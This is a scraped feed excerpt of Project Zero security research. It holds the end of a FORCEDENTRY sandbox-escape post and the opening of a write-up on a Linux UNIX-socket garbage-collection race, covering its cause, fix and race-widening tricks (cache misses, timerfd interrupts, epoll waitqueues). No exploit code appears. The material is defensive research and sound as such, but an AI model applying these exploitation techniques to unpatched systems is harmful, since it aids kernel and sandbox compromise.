 <p class="YDzVciBUld-c4"><span>In response to this exploit</span><span>&nbsp;</span><span class="YDzVciBUld-c6"><a class="YDzVciBUld-c111" href="https://developer.apple.com/documentation/ios-ipados-release-notes/ios-ipados-15_1-release-notes">iOS 15.1 significantly reduced the computational power available to NSExpressions</a></span><span>:</span></p>
 <p class="YDzVciBUld-c1"><span class="YDzVciBUld-c2 YDzVciBUld-c3"></span></p>
 <p class="YDzVciBUld-c4 YDzVciBUld-c12"><span class="YDzVciBUld-c3 YDzVciBUld-c13">NSExpression immediately forbids certain operations that have significant side effects, like creating and destroying objects. Additionally, casting string class names into Class objects with NSConstantValueExpression is deprecated.</span></p>
 <p class="YDzVciBUld-c1 YDzVciBUld-c12"><span class="YDzVciBUld-c2 YDzVciBUld-c3"></span></p>
 <p class="YDzVciBUld-c4"><span>In addition the </span><span class="YDzVciBUld-c0">PTSection</span><span>&nbsp;and </span><span class="YDzVciBUld-c0">PTRow</span><span>&nbsp;objects have been hardened with the following check added around the parsing of serialized </span><span class="YDzVciBUld-c0">NSPredicates</span><span class="YDzVciBUld-c2 YDzVciBUld-c3">:</span></p>
 <p class="YDzVciBUld-c1"><span class="YDzVciBUld-c2 YDzVciBUld-c3"></span></p>
 <p class="YDzVciBUld-c4"><span class="YDzVciBUld-c2 YDzVciBUld-c0">if (os_variant_allows_internal_security_policies(</span></p>
 <p class="YDzVciBUld-c4"><span class="YDzVciBUld-c2 YDzVciBUld-c0">&nbsp; &nbsp; &nbsp; &quot;com.apple.PrototypeTools&quot;) {</span></p>
 <p class="YDzVciBUld-c4"><span class="YDzVciBUld-c2 YDzVciBUld-c0">&nbsp; [coder decodeObjectOfClass:NSPredicate forKey:@&quot;condition]</span></p>
 <p class="YDzVciBUld-c4"><span class="YDzVciBUld-c2 YDzVciBUld-c0">...</span></p>
 <p class="YDzVciBUld-c1"><span class="YDzVciBUld-c2 YDzVciBUld-c3"></span></p>
 <p class="YDzVciBUld-c4"><span>Object deserialization across trust boundaries still presents an enormous attack surface however</span><span>.</span></p><h2 class="YDzVciBUld-c7" id="h.fyh8k0aja0xk"><span class="YDzVciBUld-c9 YDzVciBUld-c3">Conclusion</span></h2>
 <p class="YDzVciBUld-c4"><span>Perhaps the most striking takeaway is the depth of the attack surface reachable from what would hopefully be a fairly constrained sandbox. With just two tricks (</span><span class="YDzVciBUld-c0">NSObject</span><span>&nbsp;pointers in protocols and library loading gadgets) it&#39;s likely possible to attack almost every </span><span class="YDzVciBUld-c0">initWithCoder</span><span>&nbsp;implementation in the </span><span class="YDzVciBUld-c0">dyld_shared_cache</span><span>. There are presumably many other classes in addition to </span><span class="YDzVciBUld-c0">NSPredicate</span><span>&nbsp;and </span><span class="YDzVciBUld-c0">NSExpression</span><span class="YDzVciBUld-c2 YDzVciBUld-c3">&nbsp;which provide the building blocks for logic-style exploits.</span></p>
 <p class="YDzVciBUld-c1"><span class="YDzVciBUld-c2 YDzVciBUld-c3"></span></p>
 <p class="YDzVciBUld-c4"><span class="YDzVciBUld-c2 YDzVciBUld-c3">The expressive power of NSXPC just seems fundamentally ill-suited for use across sandbox boundaries, even though it was designed with exactly that in mind. The attack surface reachable from inside a sandbox should be minimal, enumerable and reviewable. Ideally only code which is required for correct functionality should be reachable; it should be possible to determine exactly what that exposed code is and the amount of exposed code should be small enough that manually reviewing it is tractable. </span></p>
 <p class="YDzVciBUld-c1"><span class="YDzVciBUld-c2 YDzVciBUld-c3"></span></p>
 <p class="YDzVciBUld-c4"><span>NSXPC requiring developers to explicitly add remotely-exposed methods to interface protocols is a great example of how to make the attack surface enumerable - you can at least find all the entry points fairly easily. However the support for inheritance means that the attack surface exposed there likely isn&#39;t reviewable; it&#39;s simply too large for anything beyond a basic</span><span>&nbsp;example</span><span class="YDzVciBUld-c2 YDzVciBUld-c3">.</span></p>
 <p class="YDzVciBUld-c1"><span class="YDzVciBUld-c2 YDzVciBUld-c3"></span></p>
 <p class="YDzVciBUld-c4"><span class="YDzVciBUld-c2 YDzVciBUld-c3">Refactoring these critical IPC boundaries to be more prescriptive - only allowing a much narrower set of objects in this case - would be a good step towards making the attack surface reviewable. This would probably require fairly significant refactoring for NSXPC; it&#39;s built around natively supporting the Objective-C inheritance model and is used very broadly. But without such changes the exposed attack surface is just too large to audit effectively.</span></p>
 <p class="YDzVciBUld-c1"><span class="YDzVciBUld-c2 YDzVciBUld-c3"></span></p>
 <p class="YDzVciBUld-c4"><span>The advent of Memory Tagging Extensions (MTE), likely shipping in multiple consumer devices across the ARM ecosystem this year,</span><span>&nbsp;</span><span class="YDzVciBUld-c6"><a class="YDzVciBUld-c111" href="https://www.usenix.org/system/files/login/articles/login_summer19_03_serebryany.pdf">is a big step in the defense against memory corruption exploitation</a></span><span>. But attackers innovate too, and are likely already two steps ahead with a renewed focus on logic bugs. This sandbox escape exploit is likely a sign of the shift we can expect to see over the next few years if the promises of MTE can be delivered. And this exploit was far more extensible, reliable and generic than almost any memory corruption exploit could ever hope to be.</span></p>
## link
## -
## @rel
replies
## @type
application/atom+xml
## @href
https://googleprojectzero.blogspot.com/feeds/1353264177358891846/comments/default
## @title
Post Comments
## -
## @rel
replies
## @type
text/html
## @href
https://googleprojectzero.blogspot.com/2022/03/forcedentry-sandbox-escape.html#comment-form
## @title
0 Comments
## -
## @rel
edit
## @type
application/atom+xml
## @href
https://www.blogger.com/feeds/4838136820032157985/posts/default/1353264177358891846
## -
## @rel
self
## @type
application/atom+xml
## @href
https://www.blogger.com/feeds/4838136820032157985/posts/default/1353264177358891846
## -
## @rel
alternate
## @type
text/html
## @href
https://googleprojectzero.blogspot.com/2022/03/forcedentry-sandbox-escape.html
## @title
FORCEDENTRY: Sandbox Escape
## author
## name
Ryan
## uri
http://www.blogger.com/profile/17011901605865574886
## email
noreply@blogger.com
## gd:image
## @rel
http://schemas.google.com/g/2005#thumbnail
## @width
16
## @height
16
## @src
https://img1.blogblog.com/img/b16-rounded.gif
## media:thumbnail
## @xmlns:media
http://search.yahoo.com/mrss/
## @url
https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjOvov7r0oFPPVDeNeBSf3Hspypl5AGeZj30ulogkGLGBXJZoy4lDoiunsF9MptZWtnpCyKST1rrP3JtdyqUCvpsAopFrlqp_3b9EuHUFh9FJqnT3iANV_Esl-InoKip8mUjW3BRjNnPOpaj1dQyfoyr5O8apA4yJzsZcPc5mnTeMEsOcqAZQKBsKr5/s72-c/image1%286%29.png
## @height
72
## @width
72
## thr:total
0
## -
## id
tag:blogger.com,1999:blog-4838136820032157985.post-2892029424446991022
## published
24/03/2022 17:51:00
## updated
24/08/2022 16:08:43
## title
## @type
text
## #text
Racing against the clock -- hitting a tiny kernel race window
## content
## @type
html
## #text
<style type="text/css">.lst-kix_oh8g77k3z2ge-8>li:before{content:"\0025a0  "}ol.lst-kix_94mysn7p9quk-2.start{counter-reset:lst-ctn-kix_94mysn7p9quk-2 0}.lst-kix_94mysn7p9quk-5>li{counter-increment:lst-ctn-kix_94mysn7p9quk-5}.lst-kix_oh8g77k3z2ge-6>li:before{content:"\0025cf  "}ol.lst-kix_94mysn7p9quk-7{list-style-type:none}ol.lst-kix_94mysn7p9quk-6{list-style-type:none}.lst-kix_oh8g77k3z2ge-7>li:before{content:"\0025cb  "}ol.lst-kix_94mysn7p9quk-8{list-style-type:none}.lst-kix_oh8g77k3z2ge-4>li:before{content:"\0025cb  "}ol.lst-kix_94mysn7p9quk-3{list-style-type:none}ol.lst-kix_94mysn7p9quk-2{list-style-type:none}ol.lst-kix_94mysn7p9quk-5{list-style-type:none}ol.lst-kix_94mysn7p9quk-4{list-style-type:none}.lst-kix_oh8g77k3z2ge-5>li:before{content:"\0025a0  "}ol.lst-kix_94mysn7p9quk-1{list-style-type:none}ol.lst-kix_94mysn7p9quk-0{list-style-type:none}.lst-kix_oh8g77k3z2ge-0>li:before{content:"\0025cf  "}.lst-kix_94mysn7p9quk-0>li{counter-increment:lst-ctn-kix_94mysn7p9quk-0}.lst-kix_oh8g77k3z2ge-2>li:before{content:"\0025a0  "}.lst-kix_oh8g77k3z2ge-3>li:before{content:"\0025cf  "}ol.lst-kix_94mysn7p9quk-5.start{counter-reset:lst-ctn-kix_94mysn7p9quk-5 0}.lst-kix_94mysn7p9quk-4>li{counter-increment:lst-ctn-kix_94mysn7p9quk-4}.lst-kix_oh8g77k3z2ge-1>li:before{content:"\0025cb  "}ol.lst-kix_94mysn7p9quk-8.start{counter-reset:lst-ctn-kix_94mysn7p9quk-8 0}.lst-kix_u4yb8nbjtsh3-5>li:before{content:"\0025a0  "}.lst-kix_u4yb8nbjtsh3-6>li:before{content:"\0025cf  "}ol.lst-kix_94mysn7p9quk-1.start{counter-reset:lst-ctn-kix_94mysn7p9quk-1 0}.lst-kix_u4yb8nbjtsh3-4>li:before{content:"\0025cb  "}.lst-kix_u4yb8nbjtsh3-8>li:before{content:"\0025a0  "}.lst-kix_94mysn7p9quk-0>li:before{content:"" counter(lst-ctn-kix_94mysn7p9quk-0,decimal) ". "}.lst-kix_u4yb8nbjtsh3-7>li:before{content:"\0025cb  "}.lst-kix_94mysn7p9quk-3>li{counter-increment:lst-ctn-kix_94mysn7p9quk-3}.lst-kix_94mysn7p9quk-6>li{counter-increment:lst-ctn-kix_94mysn7p9quk-6}ol.lst-kix_94mysn7p9quk-4.start{counter-reset:lst-ctn-kix_94mysn7p9quk-4 0}.lst-kix_94mysn7p9quk-2>li{counter-increment:lst-ctn-kix_94mysn7p9quk-2}ol.lst-kix_94mysn7p9quk-7.start{counter-reset:lst-ctn-kix_94mysn7p9quk-7 0}.lst-kix_94mysn7p9quk-6>li:before{content:"" counter(lst-ctn-kix_94mysn7p9quk-6,decimal) ". "}.lst-kix_94mysn7p9quk-8>li{counter-increment:lst-ctn-kix_94mysn7p9quk-8}ul.lst-kix_oh8g77k3z2ge-7{list-style-type:none}ul.lst-kix_oh8g77k3z2ge-8{list-style-type:none}.lst-kix_94mysn7p9quk-5>li:before{content:"" counter(lst-ctn-kix_94mysn7p9quk-5,lower-roman) ". "}ul.lst-kix_oh8g77k3z2ge-3{list-style-type:none}ul.lst-kix_oh8g77k3z2ge-4{list-style-type:none}.lst-kix_u4yb8nbjtsh3-0>li:before{content:"\0025cf  "}ul.lst-kix_oh8g77k3z2ge-5{list-style-type:none}ul.lst-kix_oh8g77k3z2ge-6{list-style-type:none}.lst-kix_94mysn7p9quk-4>li:before{content:"" counter(lst-ctn-kix_94mysn7p9quk-4,lower-latin) ". "}ul.lst-kix_oh8g77k3z2ge-0{list-style-type:none}.lst-kix_u4yb8nbjtsh3-1>li:before{content:"\0025cb  "}.lst-kix_u4yb8nbjtsh3-2>li:before{content:"\0025a0  "}ul.lst-kix_oh8g77k3z2ge-1{list-style-type:none}.lst-kix_94mysn7p9quk-1>li{counter-increment:lst-ctn-kix_94mysn7p9quk-1}ul.lst-kix_oh8g77k3z2ge-2{list-style-type:none}ol.lst-kix_94mysn7p9quk-0.start{counter-reset:lst-ctn-kix_94mysn7p9quk-0 0}.lst-kix_94mysn7p9quk-1>li:before{content:"" counter(lst-ctn-kix_94mysn7p9quk-1,lower-latin) ". "}.lst-kix_94mysn7p9quk-3>li:before{content:"" counter(lst-ctn-kix_94mysn7p9quk-3,decimal) ". "}.lst-kix_94mysn7p9quk-7>li{counter-increment:lst-ctn-kix_94mysn7p9quk-7}.lst-kix_u4yb8nbjtsh3-3>li:before{content:"\0025cf  "}.lst-kix_94mysn7p9quk-2>li:before{content:"" counter(lst-ctn-kix_94mysn7p9quk-2,lower-roman) ". "}ul.lst-kix_u4yb8nbjtsh3-6{list-style-type:none}ul.lst-kix_u4yb8nbjtsh3-5{list-style-type:none}ul.lst-kix_u4yb8nbjtsh3-8{list-style-type:none}ul.lst-kix_u4yb8nbjtsh3-7{list-style-type:none}ul.lst-kix_u4yb8nbjtsh3-2{list-style-type:none}ul.lst-kix_u4yb8nbjtsh3-1{list-style-type:none}ol.lst-kix_94mysn7p9quk-3.start{counter-reset:lst-ctn-kix_94mysn7p9quk-3 0}ul.lst-kix_u4yb8nbjtsh3-4{list-style-type:none}ul.lst-kix_u4yb8nbjtsh3-3{list-style-type:none}li.li-bullet-0:before{margin-left:-18pt;white-space:nowrap;display:inline-block;min-width:18pt}ol.lst-kix_94mysn7p9quk-6.start{counter-reset:lst-ctn-kix_94mysn7p9quk-6 0}.lst-kix_94mysn7p9quk-7>li:before{content:"" counter(lst-ctn-kix_94mysn7p9quk-7,lower-latin) ". "}.lst-kix_94mysn7p9quk-8>li:before{content:"" counter(lst-ctn-kix_94mysn7p9quk-8,lower-roman) ". "}ul.lst-kix_u4yb8nbjtsh3-0{list-style-type:none}ol{margin:0;padding:0}table td,table th{padding:0}.c15{padding-top:20pt;padding-bottom:6pt;line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}.c0{padding-top:0pt;padding-bottom:0pt;line-height:1.5;orphans:2;widows:2;text-align:left;height:11pt}.c1{color:#000000;font-weight:400;text-decoration:none;vertical-align:baseline;font-size:11pt;font-family:"Arial";font-style:normal}.c8{color:#000000;font-weight:400;text-decoration:none;vertical-align:baseline;font-size:20pt;font-family:"Arial";font-style:normal}.c5{color:#cc0000;font-weight:700;text-decoration:none;vertical-align:baseline;font-size:9pt;font-family:"Courier New";font-style:normal}.c26{padding-top:18pt;padding-bottom:6pt;line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}.c13{color:#000000;font-weight:400;text-decoration:none;vertical-align:baseline;font-size:11pt;font-family:"Arial";font-style:italic}.c2{color:#000000;font-weight:400;text-decoration:none;vertical-align:baseline;font-size:9pt;font-family:"Courier New";font-style:normal}.c3{padding-top:0pt;padding-bottom:0pt;line-height:1.5;orphans:2;widows:2;text-align:left}.c10{color:#000000;text-decoration:none;vertical-align:baseline;font-size:10pt;font-style:normal}.c7{color:#000000;text-decoration:none;vertical-align:baseline;font-size:11pt;font-style:normal}.c11{text-decoration-skip-ink:none;-webkit-text-decoration-skip:none;color:#1155cc;text-decoration:underline}.c22{color:#000000;text-decoration:none;vertical-align:baseline;font-style:normal}.c23{font-weight:400;font-size:16pt;font-family:"Arial"}.c19{background-color:#ffffff;max-width:468pt;padding:72pt 72pt 72pt 72pt}.c4{font-weight:400;font-family:"Courier New"}.c20{padding:0;margin:0}.c12{color:inherit;text-decoration:inherit}.c17{margin-left:108pt;padding-left:0pt}.c14{margin-left:36pt;padding-left:0pt}.c21{margin-left:72pt;padding-left:0pt}.c16{font-style:italic}.c25{background-color:#f4cccc}.c6{font-weight:700}.c18{font-family:"Courier New"}.c9{font-size:9pt}.c24{font-size:10pt}.title{padding-top:0pt;color:#000000;font-size:26pt;padding-bottom:3pt;font-family:"Arial";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}.subtitle{padding-top:0pt;color:#666666;font-size:15pt;padding-bottom:16pt;font-family:"Arial";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}li{color:#000000;font-size:11pt;font-family:"Arial"}p{margin:0;color:#000000;font-size:11pt;font-family:"Arial"}h1{padding-top:20pt;color:#000000;font-size:20pt;padding-bottom:6pt;font-family:"Arial";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}h2{padding-top:18pt;color:#000000;font-size:16pt;padding-bottom:6pt;font-family:"Arial";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}h3{padding-top:16pt;color:#434343;font-size:14pt;padding-bottom:4pt;font-family:"Arial";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}h4{padding-top:14pt;color:#666666;font-size:12pt;padding-bottom:4pt;font-family:"Arial";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}h5{padding-top:12pt;color:#666666;font-size:11pt;padding-bottom:4pt;font-family:"Arial";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}h6{padding-top:12pt;color:#666666;font-size:11pt;padding-bottom:4pt;font-family:"Arial";line-height:1.5;page-break-after:avoid;font-style:italic;orphans:2;widows:2;text-align:left}</style></head><body class="c19">
 <p class="c3"><span class="c6">TL;DR:</span></p>
 <p class="c3"><span>How to make a tiny kernel race window really large even on kernels without </span><span class="c4">CONFIG_PREEMPT</span><span class="c1">:</span></p><ul style="padding: 0;" class="c20 lst-kix_u4yb8nbjtsh3-0 start"><li style="margin-left: 46pt;" class="c3 c14 li-bullet-0"><span>use</span><span class="c1">&nbsp;a cache miss to widen the race window a little bit</span></li><li style="margin-left: 46pt;" class="c3 c14 li-bullet-0"><span class="c1">make a timerfd expire in that window (which will run in an interrupt handler - in other words, in hardirq context)</span></li><li style="margin-left: 46pt;" class="c3 c14 li-bullet-0"><span class="c1">make sure that the wakeup triggered by the timerfd has to churn through 50000 waitqueue items created by epoll</span></li></ul>
 <p class="c0"><span class="c1"></span></p>
 <p class="c3"><span class="c1">Racing one thread against a timer also avoids accumulating timing variations from two threads in each race attempt - hence the title. On the other hand, it also means you now have to deal with how hardware timers actually work, which introduces its own flavors of weird timing variations.</span></p><h1 class="c15" id="h.au2flcod0vb"><span class="c8">Introduction</span></h1>
 <p class="c3"><span>I recently discovered a race condition (</span><span class="c11"><a class="c121" href="https://crbug.com/project-zero/2247">https://crbug.com/project-zero/2247</a></span><span>) in the Linux kernel.</span><span>&nbsp;(While trying to explain to someone how </span><span class="c11"><a class="c121" href="https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=cbcf01128d0a92e131bd09f1688fe032480b65ca">the fix for CVE-2021-0920</a></span><span>&nbsp;worked - I was explaining why the Unix GC is now safe, and then got confused because I couldn&#39;t actually figure out why it&#39;s safe after that fix, eventually realizing that it actually isn&#39;t safe.) It&#39;s a fairly narrow race window, so I was wondering whether it could be hit with a small number of attempts - especially on kernels that aren&#39;t built with </span><span class="c4">CONFIG_PREEMPT</span><span>, which would make it possible to preempt a thread with another thread, </span><span class="c11"><a class="c121" href="https://static.sched.com/hosted_files/lsseu2019/04/LSSEU2019%20-%20Exploiting%20race%20conditions%20on%20Linux.pdf#page=12">as I described at LSSEU2019</a></span><span class="c1">.</span></p>
 <p class="c0"><span class="c1"></span></p>
 <p class="c3"><span>This is a writeup of how I managed to hit the race on a normal Linux desktop kernel, with a hit rate somewhere around 30% if the proof of concept has been tuned for the specific machine. I didn&#39;t do a full exploit though, I stopped at getting evidence of use-after-free (UAF) accesses (with the help of a very large file descriptor table and </span><span class="c11"><a class="c121" href="https://lwn.net/Articles/819834/">userfaultfd</a></span><span class="c1">, which might not be available to normal users depending on system configuration) because that&#39;s the part I was curious about.</span></p>
 <p class="c0"><span class="c1"></span></p>
 <p class="c3"><span class="c6">This also demonstrates that even very small race conditions can still be exploitable if someone sinks enough time into writing an exploit, so be careful if you dismiss very small race windows as unexploitable or don&#39;t treat such issues as security bugs.</span></p>
 <p class="c0"><span class="c1"></span></p>
 <p class="c3"><span>The UAF reproducer is </span><span class="c11"><a class="c121" href="https://bugs.chromium.org/p/project-zero/issues/detail?id=2247#c6">in our bugtracker</a></span><span class="c1">.</span></p><h1 class="c15" id="h.qtcj62oowcyh"><span class="c8">The bug</span></h1>
 <p class="c3"><span>In the UNIX domain socket garbage collection code (which is needed to deal with reference loops formed by UNIX</span><span>&nbsp;domain sockets</span><span>&nbsp;that use </span><span class="c4">SCM_RIGHTS</span><span class="c1">&nbsp;file descriptor passing), the kernel tries to figure out whether it can account for all references to some file by comparing the file&#39;s refcount with the number of references from inflight SKBs (socket buffers). If they are equal, it assumes that the UNIX domain sockets subsystem effectively has exclusive access to the file because it owns all references.</span></p>
 <p class="c0"><span class="c1"></span></p>
 <p class="c3"><span>(The same pattern also appears for files as an optimization in </span><span class="c4">__fdget_pos()</span><span>, see </span><span class="c11"><a class="c121" href="https://lore.kernel.org/lkml/CAG48ez1pnatAB095dnbrn9LbuQe4+ENwh-WEW36pM40ozhpruw@mail.gmail.com/">this LKML thread</a></span><span class="c1">.)</span></p>
 <p class="c0"><span class="c1"></span></p>
 <p class="c3"><span>The problem is that </span><span class="c4">struct file</span><span>&nbsp;can also be referenced from an RCU read-side critical section (which you can&#39;t detect by looking at the refcount), and such an RCU reference can be upgraded into a refcounted reference using </span><span class="c4">get_file_rcu()</span><span>&nbsp;/ </span><span class="c4">get_file_rcu_many()</span><span>&nbsp;by </span><span class="c4">__fget_files()</span><span>&nbsp;as long as the refcount is non-zero. For example, when this happens in the </span><span class="c4">dup()</span><span class="c1">&nbsp;syscall, the resulting reference will then be installed in the FD table and be available for subsequent syscalls.</span></p>
 <p class="c0"><span class="c1"></span></p>
 <p class="c3"><span>When the garbage collector (GC) believes that it has exclusive access to a file, it will perform operations on that file that violate the locking rules used in normal socket-related syscalls such as </span><span class="c4">recvmsg()</span><span>&nbsp;- </span><span class="c4">unix_stream_read_generic()</span><span>&nbsp;assumes that queued SKBs can only be removed under the </span><span class="c4">-&gt;iolock</span><span>&nbsp;mutex, but the GC removes queued SKBs without using that mutex. (Thanks to Xingyu Jin for explaining that to me.)</span></p>
 <p class="c0"><span class="c1"></span></p>
 <p class="c3"><span>One way of looking at this bug is that the GC is working correctly - here&#39;s a state diagram showing some of the possible states of a </span><span class="c4">struct file</span><span class="c1">, with more specific states nested under less specific ones and with the state transition in the GC marked:</span></p>
 <p class="c3"></p>
  
 <p class="c3"><span class="c1"><a href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgKajtxfGAZhXanWS7kcvJozqQU2jozVQGIZdgex6_IRhp9jWHiJiL2KQddxH7Ma02d5sqhnXROh1PacqksZu3sA7-zjwh3ES8E8fQ7Jza8lu2claui1T9xYN3wrgv4J9yMFxbrUIAGiouvy4GGq-J69qROIjIITzvNpMQtJpljanHvTgd4xgrhZfRt/s641/image19.png" style="display: block; padding: 1em 0;text-align: center;"><img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgKajtxfGAZhXanWS7kcvJozqQU2jozVQGIZdgex6_IRhp9jWHiJiL2KQddxH7Ma02d5sqhnXROh1PacqksZu3sA7-zjwh3ES8E8fQ7Jza8lu2claui1T9xYN3wrgv4J9yMFxbrUIAGiouvy4GGq-J69qROIjIITzvNpMQtJpljanHvTgd4xgrhZfRt/s641/image19.png" border="0" alt="All relevant states are RCU-accessible. An RCU-accessible object can have either a zero refcount or a positive refcount. Objects with a positive refcount can be either live or owned by the garbage collector. When the GC attempts to grab a file, it transitions from the state &quot;live&quot; to the state &quot;owned by GC&quot; by getting exclusive ownership of all references to the file." style="max-height: 750; max-width: 600px;"title="All relevant states are RCU-accessible. An RCU-accessible object can have either a zero refcount or a positive refcount. Objects with a positive refcount can be either live or owned by the garbage collector. When the GC attempts to grab a file, it transitions from the state &quot;live&quot; to the state &quot;owned by GC&quot; by getting exclusive ownership of all references to the file." /></a></span></p>
 <p class="c0"><span class="c1"></span></p>
 <p class="c3"><span>While </span><span class="c4">__fget_files()</span><span>&nbsp;is making an incorrect assumption about the state of the </span><span class="c4">struct file</span><span>&nbsp;while it is trying to narrow down its possible states - it checks whether </span><span class="c4">get_file_rcu()</span><span>&nbsp;/ </span><span class="c4">get_file_rcu_many()</span><span class="c1">&nbsp;succeeds, which narrows the file&#39;s state down a bit but not far enough:</span></p>
  <p class="c3"></p>
  
 <p class="c3"><span class="c1"><a href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgab4PkrLpvTF9E3D-nw5dSk35gvYRa--cQy0Oi60WjpbOjZbKE5zKNWa5ZEsuI-q7-UVZJrJD4Au-gTBF0p1VJSQ9gY75yIYL72zENk2Nt9RSQXBeJrIjtueSKK3xi3QN3a7dSAKXf-6JAL0RZXrnpCh3CdcC_QAyZK-hbbqXesvQQWlys0V-N3PE7/s638/image10%281%29.png" style="display: block; padding: 1em 0;text-align: center;"><img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgab4PkrLpvTF9E3D-nw5dSk35gvYRa--cQy0Oi60WjpbOjZbKE5zKNWa5ZEsuI-q7-UVZJrJD4Au-gTBF0p1VJSQ9gY75yIYL72zENk2Nt9RSQXBeJrIjtueSKK3xi3QN3a7dSAKXf-6JAL0RZXrnpCh3CdcC_QAyZK-hbbqXesvQQWlys0V-N3PE7/s638/image10%281%29.png" border="0" alt="__fget_files() first uses get_file_rcu() to conditionally narrow the state of a file from &quot;any RCU-accessible state&quot; to &quot;any refcounted state&quot;. Then it has to narrow the state from &quot;any refcounted state&quot; to &quot;live&quot;, but instead it just assumes that they are equivalent." style="max-height: 750; max-width: 600px;"title="__fget_files() first uses get_file_rcu() to conditionally narrow the state of a file from &quot;any RCU-accessible state&quot; to &quot;any refcounted state&quot;. Then it has to narrow the state from &quot;any refcounted state&quot; to &quot;live&quot;, but instead it just assumes that they are equivalent." /></a></span></p>
 <p class="c0"><span class="c1"></span></p>
 <p class="c3"><span>And this directly leads to how </span><span class="c11"><a class="c121" href="https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=054aa8d439b9185d4f5eb9a90282d1ce74772969">the bug was fixed</a></span><span>&nbsp;(there&#39;s </span><span class="c11"><a class="c121" href="https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=e386dfc56f837da66d00a078e5314bc8382fab83">another follow-up patch</a></span><span>, but that one just tries to clarify the code and recoup some of the resulting performance loss) - the fix adds another check in </span><span class="c4">__fget_files()</span><span>&nbsp;to properly narrow down the state of the file such that the file is guaranteed to be live</span><span class="c1">:</span></p>
 <p class="c3"></p>
 <p class="c3"><span class="c1"><a href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEit6FDn3u3QdHshSHrZY09kFv_HtKUA7KlZZNKLc9t8Tx3uGJsC14qcx_IU691a14IUOH-OgfDjGpRLGh4Cwx4nlBfap1fCVOzT5PuOQXVv6e1-t79J46UO-uuUL_s6QzABu8JkrnEtyKV68GovV_o8Yem6E8Y9sl23usVNoXnoJ5xOhPZFVsconARG/s638/image16.png" style="display: block; padding: 1em 0;text-align: center;"><img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEit6FDn3u3QdHshSHrZY09kFv_HtKUA7KlZZNKLc9t8Tx3uGJsC14qcx_IU691a14IUOH-OgfDjGpRLGh4Cwx4nlBfap1fCVOzT5PuOQXVv6e1-t79J46UO-uuUL_s6QzABu8JkrnEtyKV68GovV_o8Yem6E8Y9sl23usVNoXnoJ5xOhPZFVsconARG/s638/image16.png" border="0" alt="The fix is to properly narrow the state from &quot;any refcounted state&quot; to &quot;live&quot; by checking whether the file is still referenced by a file descriptor table entry." style="max-height: 750; max-width: 600px;"title="The fix is to properly narrow the state from &quot;any refcounted state&quot; to &quot;live&quot; by checking whether the file is still referenced by a file descriptor table entry." /></a></span></p>
 <p class="c0"><span class="c1"></span></p>
 <p class="c3"><span class="c1">The fix ensures that a live reference can only be derived from another live reference by comparing with an FD table entry, which is guaranteed to point to a live object.</span></p>
 <p class="c3"><span class="c16">[Sidenote: This scheme is similar to the one used for </span><span class="c4 c16">struct page</span><span class="c16">&nbsp;- </span><span class="c4 c16">gup_pte_range()</span><span class="c16">&nbsp;also uses the &quot;grab pointer, increment refcount, recheck pointer&quot; pattern for locklessly looking up a </span><span class="c4 c16">struct page</span><span class="c16">&nbsp;from a page table entry while ensuring that new refcounted references can&#39;t be created without holding an existing reference. This is really important for </span><span class="c4 c16">struct page</span><span class="c16">&nbsp;because a page can be given back to the page allocator and reused while </span><span class="c4 c16">gup_pte_range()</span><span class="c16">&nbsp;holds an uncounted reference to it - freed pages still have their </span><span class="c4 c16">struct page</span><span class="c13">, so there&#39;s no need to delay freeing of the page - so if this went wrong, you&#39;d get a page UAF.]</span></p>
 <p class="c0"><span class="c1"></span></p>
 <p class="c3"><span>My initial suggestion was to instead fix the issue by changing how </span><span class="c4">unix_gc()</span><span>&nbsp;ensures that it has exclusive access, letting it set the file&#39;s refcount to zero to prevent turning RCU references into refcounted ones; this would have avoided adding any code in the hot </span><span class="c4">__fget_files()</span><span>&nbsp;path, but it would have only fixed </span><span class="c4">unix_gc()</span><span>, not the </span><span class="c4">__fdget_pos()</span><span class="c1">&nbsp;case I discovered later, so it&#39;s probably a good thing this isn&#39;t how it was fixed:</span></p>
 <p class="c3"></p>
  
 <p class="c3"><span class="c1"><a href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEj1Eob19v9RoctxBGUR4nmMSrJQJXvw-WjVihOxiudjG3ssu5WfL-YRXj_Gd99CifW1GplS3Yhwlc2WIc0-nPSOecYylZouk0zco24SgxUyyaFDps2wck4jVhWCcSbU7l3cFKB-hk4q3EOwwFJIgFKFSNnW9DgprGIMo5EKTMCt7SFnNdofQ9LnCjQu/s641/image5%283%29.png" style="display: block; padding: 1em 0;text-align: center;"><img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEj1Eob19v9RoctxBGUR4nmMSrJQJXvw-WjVihOxiudjG3ssu5WfL-YRXj_Gd99CifW1GplS3Yhwlc2WIc0-nPSOecYylZouk0zco24SgxUyyaFDps2wck4jVhWCcSbU7l3cFKB-hk4q3EOwwFJIgFKFSNnW9DgprGIMo5EKTMCt7SFnNdofQ9LnCjQu/s641/image5%283%29.png" border="0" alt="" style="max-height: 750; max-width: 600px;"title="" /></a></span></p>
 <p class="c3"><span class="c16">[Sidenote: In my original bug report I wrote that you&#39;d have to wait an RCU grace period in the GC for this, but that wouldn&#39;t be necessary as long as the GC ensures that a reaped socket&#39;s refcount never becomes non-zero again.]</span></p><h1 class="c15" id="h.60irov9pzlh"><span class="c8">The race</span></h1>
